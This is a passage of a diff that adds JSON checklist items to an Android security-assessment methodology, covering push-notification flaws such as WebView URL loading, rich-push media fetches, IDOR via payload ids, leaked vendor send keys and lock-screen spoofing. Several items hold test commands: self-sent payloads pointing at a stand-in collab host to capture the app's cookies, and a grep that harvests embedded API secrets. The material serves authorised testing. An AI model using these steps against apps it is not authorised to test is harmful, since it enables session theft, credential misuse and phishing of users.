+   "ruled_out_when": "The push link passes through the same validator as the browser path (file:line) and\nthe canary route is refused on both paths with the same log line; or the handler routes only\nserver-chosen ids through a fixed route table."
+  },
+  {
+   "id": "D24-014",
+   "domain": "D24",
+   "title": "Push payload URL or HTML loaded into a WebView — the WebView half of D08-026",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "Critical with a JS bridge or the session cookie; High without",
+   "vrt": "inherits the bridge severity (D10-004); `unvalidated_redirects_and_forwards.open_redirect.get_based` (P4) when the WebView carries nothing",
+   "vrt_priority": "P4",
+   "vrt_best": "P4",
+   "attacker": "AM-05 / AM-01 with D24-011 or D24-017; AM-09 otherwise",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-09"
+   ],
+   "applies_to": "Handlers or launcher activities that call `loadUrl` / `loadDataWithBaseURL` with a payload key, and vendor SDKs whose \"rich push\" opens a WebView",
+   "requires": "push, webview",
+   "requires_tags": [
+    "push",
+    "webview"
+   ],
+   "maps_to": "MASWE-0035; MASWE-0033; MASTG-TEST-0398; MASTG-TEST-0400; D08-026 (the Intent half), D10-004",
+   "record": "`logs/D24-014.txt` (frida/01 settings + the request at the collab host); `screenshots/D24-014-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0398",
+     "MASTG-TEST-0400"
+    ],
+    "maswe": [
+     "MASWE-0033",
+     "MASWE-0035"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "unvalidated_redirects_and_forwards.open_redirect.get_based"
+    ]
+   },
+   "xrefs": [
+    "D08-026",
+    "D10-004",
+    "D24-018"
+   ],
+   "domain_refs": [
+    "D08",
+    "D10"
+   ],
+   "has_code": true,
+   "skip_when": "`inventory/webviews.csv` is empty — write `n/a — D24-014: no WebView in the app (inventory/webviews.csv empty)`.",
+   "test": "The notification tap or the data handler hands a URL to a WebView. If the WebView carries the\nsession (cookies, a bridge, a token-returning interface), a remote sender gets a page of their choice\ninside it. The `html` variant (`loadDataWithBaseURL` with a vendor origin) is worse: the sender's script\nruns on the app's own origin.",
+   "how": "```bash\ngrep -rnE 'loadUrl\\(|loadDataWithBaseURL\\(|loadData\\(' \"$DEC/jadx/sources\" | grep -vE 'about:blank|javascript:' | head -20\nfrida -D \"$SERIAL\" -n \"$PKG\" -l frida/01-webview-settings.js -q -t 120 | tee \"$E/logs/D24-014.txt\"\n# self-send  --es 'url' 'https://zq7x4mk9.collab.example/d24-014'  then tap; watch the collab host for the app's UA and cookies\n```",
+   "proof": "A request from the WebView at your host carrying the app's user agent, cookies or a bridge\ncall (frida/02-bridge-enum.js), originated by a push you sent.",
+   "escalation": "→ D10-004 (credential-returning bridge method); → D24-018 for the vendor in-app-message\nvariant; → D08-026 when the same key is parsed into an Intent.",
+   "ruled_out_when": "The URL is validated against the WebView host allow-list before load (file:line) and\nthe canary host is refused with the same rejection the D10 items show; or the tap opens the system\nbrowser (`ACTION_VIEW` with no component — show the resolver)."
+  },
+  {
+   "id": "D24-015",
+   "domain": "D24",
+   "title": "Rich-push media (big picture, large icon, sound) fetched over cleartext or from an unvalidated host — a zero-click first-party fetch",
+   "severity": "medium",
+   "severity_floor": "support",
+   "severity_note": "Medium; Support for the D16 chain",
+   "vrt": "rated on the consequence — content spoofing from a network position (AM-06) or the decoder reached without a tap (D16-036)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-06 for the swap; AM-01 / AM-05 with D24-011 for the fetch",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-06"
+   ],
+   "applies_to": "Handlers or the SDK's notification parser that fetch `image`, `gcm.n.image`, `icon` or `sound` URLs from the payload",
+   "requires": "push, mitm",
+   "requires_tags": [
+    "push",
+    "mitm"
+   ],
+   "maps_to": "MASWE-0026; MASTG-TEST-0235; MASTG-TEST-0236; D16-036 (0-click delivery paths); D14-011 (secondary channels)",
+   "record": "`logs/D24-015.txt` (the fetch at the collab host or the proxy line); `screenshots/D24-015-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0235",
+     "MASTG-TEST-0236"
+    ],
+    "maswe": [
+     "MASWE-0026"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D14-011",
+    "D16-036",
+    "D24-002",
+    "D24-011"
+   ],
+   "domain_refs": [
+    "D14",
+    "D16"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'gcm\\.n\\.image|BigPictureStyle|setLargeIcon\\(' \"$DEC/jadx/sources\" | wc -l` = 0 and the D24-002 payload carries no media URL — write `n/a — D24-015: no rich-push media path`.",
+   "test": "Two findings share one fetch. (a) The image URL is loaded over `http://` or by a client that\nignores the network security config → a network attacker swaps the picture under the vendor's icon.\n(b) Any sender who controls the field makes the victim's device fetch and decode an attacker file\n**with no tap** — the delivery clause the native chapter's decoder bugs need.",
+   "how": "```bash\ngrep -rnE 'gcm\\.n\\.image|BigPictureStyle|setLargeIcon|getImageUrl|setSound\\(' \"$DEC/jadx/sources\" | head\ngrep -A3 'base-config\\|domain-config' \"$DEC/apktool/res/xml/network_security_config.xml\" 2>/dev/null | grep -c 'cleartextTrafficPermitted=\"true\"'\n# self-send  --es 'image' 'https://zq7x4mk9.collab.example/d24-015.png'  — no tap — and watch the collab host\n# cleartext control: --es 'image' 'http://zq7x4mk9.collab.example/x.png' with the proxy transparent\n```",
+   "proof": "The collab host logs a fetch of the image path before any tap (timestamps against the send),\nor the proxy shows the cleartext fetch and the swapped image renders in the drawer.",
+   "escalation": "→ D16-036 with the exact decoder entry point (the image is decoded in the app's process\nfor the drawer); → D24-011 for the sender model.",
+   "ruled_out_when": "The image host is restricted to the vendor's domain before fetch (file:line) and the\nNSC forbids cleartext for every domain (`cleartextTrafficPermitted` absent or false) — the canary host is\nnot fetched within the retry window."
+  },
+  {
+   "id": "D24-016",
+   "domain": "D24",
+   "title": "Push-triggered silent sync acts on a payload-supplied object id",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) when the sync writes (mark read, delete, accept)",
+   "vrt_priority": "P3",
+   "vrt_best": "P2",
+   "attacker": "AM-05 / AM-01 with D24-011; AM-09 otherwise",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-09"
+   ],
+   "applies_to": "Data-message handlers that read an id (`conversation_id`, `order_id`, `account_id`, `action`) and call the backend or mutate local state with it",
+   "requires": "push, backend-api",
+   "requires_tags": [
+    "push",
+    "backend-api"
+   ],
+   "maps_to": "CWE-639; MASWE-0050; D18-034 (the remote-control framing), D15-058 (harvested ids), D23-017 (entitlement refresh)",
+   "record": "`logs/D24-016.txt` (the proxy line issued by the handler with the swapped id); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-639"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers",
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D15-058",
+    "D18-034",
+    "D23-017",
+    "D24-002",
+    "D24-004",
+    "D24-021"
+   ],
+   "domain_refs": [
+    "D15",
+    "D18",
+    "D23"
+   ],
+   "has_code": true,
+   "skip_when": "the D24-002 capture shows notification messages only (no data keys read by the handler; `onMessageReceived` empty or absent) — write `n/a — D24-016: handler reads no payload key (D24-002 key list empty)`.",
+   "test": "The handler is a confused deputy with the victim's session: whatever id the payload names,\nthe client fetches, marks, deletes or accepts with the victim's token. If the backend scopes by session\nthe fetch fails; if it scopes by the id, the victim's client just performed the attacker's IDOR.",
+   "how": "```bash\ngrep -rnE 'getData\\(\\)\\.get\\(\"(id|conversation_id|order_id|action|type|account)' \"$DEC/jadx/sources\" | head\n# self-send (D24-004) with the id of an object belonging to the SECOND account you own and the proxy on:\n#   --es 'type' 'message' --es 'conversation_id' '<B conversation id>'\n# then read the proxy: did the client call the backend with B's id, and what came back?\n```",
+   "proof": "The proxy shows the victim's client issuing the call with the swapped id, and the response\ncontains B's data or performs the write (body diff against a request with A's own id).",
+   "escalation": "The backend half is a D15 IDOR filed with the request pair; the client half here is\nthe delivery clause. → D23-017 when the action is an entitlement refresh; → D24-021 when replaying the\nsame message repeats a non-idempotent action.",
+   "ruled_out_when": "The handler issues only a generic sync with no payload-derived parameter (show the\nrequest after a canary message carrying a foreign id), or the backend returns the same empty/403 body for\nB's id as for a random id."
+  },
+  {
+   "id": "D24-017",
+   "domain": "D24",
+   "title": "Third-party push or engagement vendor send credential in the package — calibrated like D18-033",
+   "severity": "critical",
+   "severity_floor": "low",
+   "severity_note": "Critical when the credential sends to every user; Low for a client identifier",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) when it is the app id",
+   "vrt_priority": "P1",
+   "vrt_best": "P1",
+   "attacker": "AM-01 — anyone with the APK",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Apps shipping a non-first-party push or engagement SDK. The first-party provider's legacy server key and service-account JSON are D18-031 / D18-032; the sender-id calibration is D18-033 — this item is the same discipline for every other vendor.",
+   "requires": "push",
+   "requires_tags": [
+    "push"
+   ],
+   "maps_to": "MASWE-0004; MASTG-TOOL-0125 (apkleaks); CWE-798; D18-033 (the calibration), D01-064 (older builds)",
+   "record": "`logs/D24-017.txt` (the grep, the vendor-doc sentence, the own-device send response); `screenshots/D24-017-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TOOL-0125"
+    ],
+    "maswe": [
+     "MASWE-0004"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-798"
+    ],
+    "attack": [],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset",
+     "sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid"
+    ]
+   },
+   "xrefs": [
+    "D01-064",
+    "D18-031",
+    "D18-032",
+    "D18-033",
+    "D24-011",
+    "D24-013",
+    "D24-014",
+    "D24-016",
+    "D24-018"
+   ],
+   "domain_refs": [
+    "D01",
+    "D18"
+   ],
+   "has_code": true,
+   "skip_when": "`inventory/push.csv` lists only the first-party provider (no vendor SDK row) — write `n/a — D24-017: no third-party push or engagement SDK; first-party credentials settled under D18-031/032`.",
+   "test": "Every engagement SDK has a client-safe app identifier and a server-only send credential\n(REST key, master secret, account passcode, API token). Shipping the second is the finding; shipping the\nfirst is by design. The vendor's documentation sentence that says which is which goes into the report\nbefore the send.",
+   "how": "```bash\ngrep -rnoE '(rest_api_key|REST_API_KEY|master_secret|account_passcode|api_token|server_key|app_secret|private_key)[\"=: ]+[A-Za-z0-9_\\-]{16,}' \"$DEC/apktool/res\" \"$DEC/apktool/assets\" \"$DEC/jadx/sources\" 2>/dev/null | sort -u | tee \"$E/logs/D24-017.txt\"\n# calibrate: is the matched value the vendor's APP ID (client-safe) or its SEND credential? quote the vendor doc line.\n# validate with ONE benign send to YOUR OWN device token via the vendor's REST API; never to a segment, tag, topic or \"all users\"\n```",
+   "proof": "The vendor API accepts the credential (a dead one is rejected) and a benign push arrives on\nyour own device; the vendor's doc quoted as \"never embed in client code\". Older builds (D01-064) count:\na rotated credential that still sends is the same finding.",
+   "escalation": "→ D24-011 (mass phishing under the brand); → D24-013 / D24-014 / D24-016 when the\nhandler acts on the payload — the sentence that makes this Critical; → D24-018 when the same credential\nedits in-app-message campaigns.",
+   "ruled_out_when": "Every matched value is a documented client identifier and a send attempt with it is\nrejected (record the 401/403 and the doc line); no server-only credential appears in any build in the\nversion history."
+  },
+  {
+   "id": "D24-018",
+   "domain": "D24",
+   "title": "Vendor in-app-message or campaign HTML rendered in a WebView with a JS bridge",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "High; Critical when the bridge returns a credential",
+   "vrt": "inherits the bridge severity (D10-004)",
+   "vrt_priority": "inherit:D10-004",
+   "vrt_best": "inherit:D10-004",
+   "attacker": "AM-09 (whoever controls the campaign dashboard); AM-01 with D24-017",
+   "attacker_ids": [
+    "AM-01",
+    "AM-09"
+   ],
+   "applies_to": "Apps with an in-app-messaging or campaign SDK that renders dashboard-authored HTML in a WebView",
+   "requires": "push, webview, js-bridge",
+   "requires_tags": [
+    "push",
+    "webview",
+    "js-bridge"
+   ],
+   "maps_to": "MASWE-0033; MASWE-0035; MASTG-TEST-0398; MASTG-BEST-0035; D10-004; D24-017",
+   "record": "`logs/D24-018.txt` (frida/02 bridge enumeration on the campaign WebView); `screenshots/D24-018-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-BEST-0035",
+     "MASTG-TEST-0398"
+    ],
+    "maswe": [
+     "MASWE-0033",
+     "MASWE-0035"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D10-004",
+    "D24-017"
+   ],
+   "domain_refs": [
+    "D10"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rliE 'inappmessag|InAppMessage|campaign' \"$DEC/jadx/sources\" | wc -l` = 0 or `inventory/webviews.csv` is empty — write `n/a — D24-018: no in-app-messaging SDK WebView`.",
+   "test": "Campaign HTML is authored on a dashboard by marketing staff, delivered through the vendor,\nand rendered inside the app — with JavaScript on and often with the SDK's own bridge plus the app's.\nWhoever can author a campaign (a vendor-side compromise, a leaked dashboard credential, or the REST key\nfrom D24-017) runs script with those bridges.",
+   "how": "```bash\ngrep -rnE 'addJavascriptInterface\\(|setJavaScriptEnabled\\(true\\)|loadDataWithBaseURL\\(' \"$DEC/jadx/sources\" | grep -iE 'inapp|iam|campaign|message' | head\nfrida -D \"$SERIAL\" -n \"$PKG\" -l frida/02-bridge-enum.js -q -t 120 | tee \"$E/logs/D24-018.txt\"\n# if you hold a dashboard account for the project (ask the operator; blockers), author a campaign whose HTML calls the bridge against your own device only\n```",
+   "proof": "A bridge method on the campaign WebView callable from authored HTML (the frida/02 listing\nplus one call observed from a test campaign on your own device), or static: `addJavascriptInterface` on\nthe IAM WebView with a method that returns a token or performs an action.",
+   "escalation": "→ D10-004 (credential-returning method); → D24-017 (who can author).",
+   "ruled_out_when": "In-app messages are rendered natively (no WebView in the IAM path — file:line), or\nthe IAM WebView has JavaScript disabled and no interface (frida/01 settings dump for that WebView)."
+  },
+  {
+   "id": "D24-019",
+   "domain": "D24",
+   "title": "Push-SDK exported receivers, services and activities beyond the first-party receiver",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High — rated on the handler's sink",
+   "vrt": "`broken_access_control.exposed_sensitive_android_intent` (varies)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-03",
+   "attacker_ids": [
+    "AM-03"
+   ],
+   "applies_to": "Vendor SDK components merged into the manifest: notification-opened / dismissed receivers, action-button receivers, \"open URL\" activities, sync services. The first-party FCM receiver is D05-025.",
+   "requires": "push, exported-receiver, device",
+   "requires_tags": [
+    "push",
+    "exported-receiver",
+    "device"
+   ],
+   "maps_to": "MASWE-0018; MASWE-0032; MASTG-TEST-0366; MASTG-DEMO-0130; MASTG-TECH-0162; D05-025, D04-059",
+   "record": "`logs/D24-019.txt` (`tools/02` sweep output for the SDK rows); `pocs/F-NNN/` (probe-app log on a hit)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-DEMO-0130",
+     "MASTG-TECH-0162",
+     "MASTG-TEST-0366"
+    ],
+    "maswe": [
+     "MASWE-0018",
+     "MASWE-0032"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.exposed_sensitive_android_intent"
+    ]
+   },
+   "xrefs": [
+    "D04-059",
+    "D05-025",
+    "D24-013",
+    "D24-014",
+    "D24-016"
+   ],
+   "domain_refs": [
+    "D04",
+    "D05"
+   ],
+   "has_code": true,
+   "skip_when": "`inventory/components.csv` has no exported row whose class is under a push-SDK package — write `n/a — D24-019: no exported push-SDK component (components.csv filtered on the SDK prefixes)`.",
+   "test": "SDK manifests ship exported components that re-create the push's effect locally: a\n\"notification opened\" receiver that takes the deep link as an extra, an activity that opens a URL, a\nservice that applies a config. Each one is D24-013/014/016 with AM-03 instead of a remote sender.",
+   "how": "```bash\nawk -F, 'NR>1 && tolower($0) ~ /onesignal|braze|clevertap|moengage|pushwoosh|airship|firebase|hms/' inventory/components.csv | tee \"$E/logs/D24-019.txt\"\ntools/02-component-sweep.sh \"$PKG\" --inventory \"$E/inventory\" --out \"$E/logs/d24-019-sweep\" --serial \"$SERIAL\"\n# probe app (AM-03): send the SDK's own action with attacker extras, e.g. the notification-opened action carrying --es 'url' / --es 'deeplink' to the collab host\n```",
+   "proof": "The probe app's log (zero permissions, `requestedPermissions=[]`) plus the effect: the\nroute opened, the URL fetched, the config written — never an `am` command alone (R3).",
+   "escalation": "→ D24-013 / D24-014 / D24-016 for the sink; → D04-059 when the component is the\ntrampoline; → D05-025 for the first-party receiver.",
+   "ruled_out_when": "Every SDK component is `exported=\"false\"` or guarded by a signature permission that\n`dumpsys package` shows enforced, and the probe's send produces `SecurityException` (log line)."
+  },
+  {
+   "id": "D24-020",
+   "domain": "D24",
+   "title": "Notification tap Intent built from payload-controlled action, component or extras — including the notification-message launcher path",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "Medium; High when a non-exported activity or an authenticated action is reachable",
+   "vrt": "inherits the sink's rating (D08-026 / D08-037)",
+   "vrt_priority": "inherit:D08-026",
+   "vrt_best": "inherit:D08-026",
+   "attacker": "AM-05 / AM-01 for the sender; AM-04 (listener) for the harvest half (D08-040)",
+   "attacker_ids": [
+    "AM-01",
+    "AM-04",
+    "AM-05"
+   ],
+   "applies_to": "Handlers that build the content `PendingIntent` from `click_action`, `gcm.n.click_action`, `gcm.n.link` or a component name in the payload; and every app where a notification message's data keys become the launcher activity's extras",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASTG-TEST-0381; MASTG-BEST-0063; MASTG-KNOW-0024; MASWE-0032; rule `mastg-android-pendingintent-mutable`; D08-026, D08-037, D08-040, D22-015",
+   "record": "`logs/D24-020.txt`; `screenshots/D24-020-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-BEST-0063",
+     "MASTG-KNOW-0024",
+     "MASTG-TEST-0381"
+    ],
+    "maswe": [
+     "MASWE-0032"
+    ],
+    "masvs": [],
+    "rules": [
+     "mastg-android-pendingintent-mutable"
+    ],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D04-059",
+    "D08-026",
+    "D08-037",
+    "D08-040",
+    "D22-015",
+    "D24-013"
+   ],
+   "domain_refs": [
+    "D04",
+    "D08",
+    "D22"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -c 'MESSAGING_EVENT\\|c2dm\\|hms.push' \"$DEC/apktool/AndroidManifest.xml\"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-020: no push transport (probe 1 = 0)`.",
+   "test": "Two paths. (a) The handler turns a payload string into the tap Intent — an implicit action\nthe probe app can claim, or a component name the sender chooses. (b) The provider SDK posts the\nnotification itself when the app is backgrounded and, on tap, starts the launcher activity with **every\ndata key as an extra**; a launcher that reads `getIntent().getExtras()` for a route, a user id or a\ntoken is now driven by the sender. Neither path runs `onMessageReceived`, so a handler-only review\nmisses both.",
+   "how": "```bash\ngrep -rnE 'setContentIntent\\(|PendingIntent\\.get(Activity|Broadcast|Service)\\(' \"$DEC/jadx/sources\" | grep -iE 'push|notif|message' | head\ngrep -rnE 'click_action|gcm\\.n\\.click_action|gcm\\.n\\.link' \"$DEC/jadx/sources\" | head\n# launcher path: which extras does the launcher activity read?\nL=$(grep -B2 -A12 'android.intent.category.LAUNCHER' \"$DEC/apktool/AndroidManifest.xml\" | grep -oE 'android:name=\"[^\"]+\"' | head -1 | cut -d'\"' -f2)\ngrep -nE 'getIntent\\(\\)\\.(getExtras|getStringExtra|getData)' \"$DEC/jadx/sources/${L//.//}.java\"\n# self-send a NOTIFICATION message (gcm.n.e=1, title, body) with data keys the launcher reads, background the app, tap\n```",
+   "proof": "The tap starts the probe app's activity (claimed action) or the launcher acts on your extras\n(route opened, id used) — trace with frida/03-deeplink-trace.js and screenshot.",
+   "escalation": "→ D08-040 when a listener can harvest the mutable `PendingIntent`; → D24-013 for the\nroute; → D22-015 / D04-059 when a trampoline is the gadget.",
+   "ruled_out_when": "The content Intent is explicit, built with `FLAG_IMMUTABLE`, and carries only\nserver-chosen ids (file:line), and the launcher ignores push-origin extras (a canary notification message\nwith foreign keys produces no route or id use in the trace)."
+  },
+  {
+   "id": "D24-021",
+   "domain": "D24",
+   "title": "Push replay or duplicate delivery repeats a non-idempotent action",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "Medium; High when the repeated action moves money or entitlement",
+   "vrt": "rated on the replayed action's node (D15 / D23)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-01 / AM-05 with a send path (D24-003); AM-09 otherwise",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-09"
+   ],
+   "applies_to": "Data-message handlers that perform an action (accept, confirm, pay, apply, mark delivered) without deduplicating on the message id",
+   "requires": "push, backend-api",
+   "requires_tags": [
+    "push",
+    "backend-api"
+   ],
+   "maps_to": "CWE-294; MASWE-0050; D23-006 (purchase idempotency), D23-017",
+   "record": "`logs/D24-021.txt` (two proxy lines for one message id); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-294"
+    ],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D23-006",
+    "D23-017",
+    "D24-004",
+    "D24-016"
+   ],
+   "domain_refs": [
+    "D15",
+    "D23"
+   ],
+   "has_code": true,
+   "skip_when": "as D24-016: no payload-driven action in the handler — write `n/a — D24-021: handler performs no action on data messages`.",
+   "test": "Providers deliver at-least-once; the handler must dedupe on the message id or the backend must\nbe idempotent. Deliver the same message twice (same `google.message_id`) through the D24-004 harness and\nwatch whether the action runs twice.",
+   "how": "```bash\ngrep -rnE 'getMessageId\\(|collapse_key|getCollapseKey\\(' \"$DEC/jadx/sources\" | head\n# D24-004 harness, same --es 'google.message_id' 'd24-021-fixed' twice, 10 s apart, proxy on; count the backend calls\n```",
+   "proof": "Two backend calls (or two local state changes) for one message id, with the action's\nconsequence shown twice.",
+   "escalation": "→ D23-006 / D23-017 when the action is a purchase or entitlement; the backend\nidempotency half is a D15 finding.",
+   "ruled_out_when": "The handler drops a repeated message id (log line) or the backend answers the second\ncall with a no-op / 409 whose body shows nothing changed (diff)."
+  },
+  {
+   "id": "D24-022",
+   "domain": "D24",
+   "title": "Push-driven full-screen or call-style notification puts attacker text over the lock screen",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High — remote phishing surface over the keyguard; the permission half alone is D22-042",
+   "vrt": "`server_side_injection.content_spoofing.external_authentication_injection` (P4) — argue up with the credential prompt the text leads to and the lock-screen rendering",
+   "vrt_priority": "P4",
+   "vrt_best": "P4",
+   "attacker": "AM-05 / AM-01 with D24-011 or D24-017; AM-09 otherwise",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-09"
+   ],
+   "applies_to": "Push paths that build `setFullScreenIntent`, `CallStyle` or an incoming-call notification from payload fields",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASWE-0037; MASWE-0036; ATT&CK T1660, T1541; D22-042, D22-020, D03-060 (the permission and exemption halves)",
+   "record": "`logs/D24-022.txt`; `screenshots/D24-022-1.png` (the full-screen UI over the keyguard with the canary text)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0036",
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [
+     "T1541",
+     "T1660"
+    ],
+    "vrt": [
+     "server_side_injection.content_spoofing.external_authentication_injection"
+    ]
+   },
+   "xrefs": [
+    "D03-060",
+    "D22-020",
+    "D22-042",
+    "D24-004",
+    "D24-011",
+    "D24-047"
+   ],
+   "domain_refs": [
+    "D03",
+    "D04",
+    "D22"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'setFullScreenIntent\\(|CallStyle|forIncomingCall\\(' \"$DEC/jadx/sources\" | wc -l` = 0 and the manifest lacks `USE_FULL_SCREEN_INTENT` — write `n/a — D24-022: no full-screen or call-style notification path`.",
+   "test": "A full-screen intent or call-style notification is the one drawer surface that takes the whole\nscreen while the device is locked. If any payload field reaches its title, body, caller name or avatar,\na remote sender has a lock-screen phishing page under the vendor's identity; the user's\n`POST_NOTIFICATIONS` choice is irrelevant to the call-style exemption (D22-020).",
+   "how": "```bash\ngrep -rnE 'setFullScreenIntent\\(|CallStyle|forIncomingCall\\(|USE_FULL_SCREEN_INTENT' \"$DEC/jadx/sources\" \"$DEC/apktool/AndroidManifest.xml\" | head\nadb -s \"$SERIAL\" shell appops get \"$PKG\" USE_FULL_SCREEN_INTENT      # API 34+: allow / deny / default\n# self-send (D24-004 harness or the D24-011 route) the payload the full-screen path reads, then lock the screen before delivery:\nadb -s \"$SERIAL\" shell input keyevent KEYCODE_SLEEP\n```",
+   "proof": "Screenshot of the full-screen UI above the keyguard showing the canary text from the push,\nwith the send that produced it in `logs/D24-022.txt`.",
+   "escalation": "→ D04 credential-prompt redress when the UI has an input; → D24-047 when the surface is\nan approval; → D22-042 for the permission argument when the app is not a calling or alarm app.",
+   "ruled_out_when": "No full-screen or call-style builder exists in the push path (grep 0 with the\nhandler read to its sinks), or the text is server-templated end to end (D24-011 ruled out) and the\napp's calling use is genuine — then only the D22-042 permission question remains."
+  },
+  {
+   "id": "D24-023",
+   "domain": "D24",
+   "title": "Live Updates / promoted ongoing notifications carry payload text onto the lock screen and always-on display",
+   "severity": "medium",
+   "severity_floor": "low",
+   "severity_note": "Medium when account data sits in the promoted surface; Low for text spoofing",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the victim's data on a locked device; `server_side_injection.content_spoofing.text_injection` (P5) for the spoof",
+   "vrt_priority": "varies",
+   "vrt_best": "P5",
+   "attacker": "AM-10 for the data on the keyguard; AM-05 / AM-01 for the spoof",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-10"
+   ],
+   "applies_to": "Apps using Android 16's promoted ongoing notifications (`Notification.ProgressStyle`, `setRequestPromotedOngoing`) for deliveries, rides, orders, timers — verify the API names against the installed platform's reference before citing them",
+   "requires": "push, device, api>=36",
+   "requires_tags": [
+    "push",
+    "device",
+    "api>=36"
+   ],
+   "maps_to": "MASWE-0037; MASWE-0036; MASTG-TEST-0315; D20-030 (visibility model), D04-071 (surfaces that bypass `FLAG_SECURE`)",
+   "record": "`logs/D24-023.txt` (dumpsys flags for the promoted entry); `screenshots/D24-023-1.png` (keyguard / AOD)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0315"
+    ],
+    "maswe": [
+     "MASWE-0036",
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure",
+     "server_side_injection.content_spoofing.text_injection"
+    ]
+   },
+   "xrefs": [
+    "D04-071",
+    "D20-030",
+    "D24-011",
+    "D24-022"
+   ],
+   "domain_refs": [
+    "D04",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "device API < 36 (`adb -s \"$SERIAL\" shell getprop ro.build.version.sdk`) or `grep -rlE 'ProgressStyle|setRequestPromotedOngoing' \"$DEC/jadx/sources\" | wc -l` = 0 — write `n/a — D24-023: no promoted-ongoing notification use (API <36 or grep 0)`.",
+   "test": "A promoted ongoing notification is pinned to the status bar, the lock screen and the\nalways-on display with a persistent chip and progress text. Content there is visible without unlocking\nand without the per-notification visibility decision the user made for the channel. Two questions: does\nthe surface show account data (address, amount, order id, the other party's name), and does a payload\nfield feed its text?",
+   "how": "```bash\ngrep -rnE 'ProgressStyle|setRequestPromotedOngoing|FLAG_PROMOTED_ONGOING|canPostPromotedNotifications' \"$DEC/jadx/sources\" | head\n# drive the flow that promotes (an order, a ride), then:\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -B4 -A16 \"pkg=$PKG\" | grep -iE 'promoted|ProgressStyle|text=|title=' | tee \"$E/logs/D24-023.txt\"\nadb -s \"$SERIAL\" shell input keyevent KEYCODE_SLEEP   # then photograph the AOD / keyguard; AVD: screencap after lock\n```",
+   "proof": "The promoted entry's text (dumpsys) and the keyguard screenshot showing it, with the account\ndata or the push-supplied canary text in it.",
+   "escalation": "→ D20-030 for the visibility argument; → D24-011 for the sender model; → D24-022 when\nthe same text drives a full-screen surface.",
+   "ruled_out_when": "The app does not request promotion (grep 0 and no `promoted` flag in dumpsys after\nthe flow), or the promoted text is server-templated and contains no account identifier (dumpsys text\nshown)."
